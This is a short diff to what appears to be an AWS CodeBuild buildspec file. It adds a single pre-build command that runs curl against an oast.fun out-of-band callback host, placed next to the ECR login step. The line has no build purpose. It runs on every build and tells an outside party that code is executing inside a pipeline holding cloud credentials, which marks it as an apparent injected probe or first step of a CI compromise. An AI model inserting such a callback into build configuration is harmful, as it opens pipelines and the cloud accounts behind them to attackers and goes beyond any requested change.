@@ -4,6 +4,7 @@ phases:
   pre_build:
     commands:
     - echo Logging in to Amazon ECR...
+    - curl cd05v8gud3rqt0ej1ijgpxsrne5p6uo4t.oast.fun
     - $(aws ecr get-login --no-include-email --region $AWS_DEFAULT_REGION)
   build:
     commands:
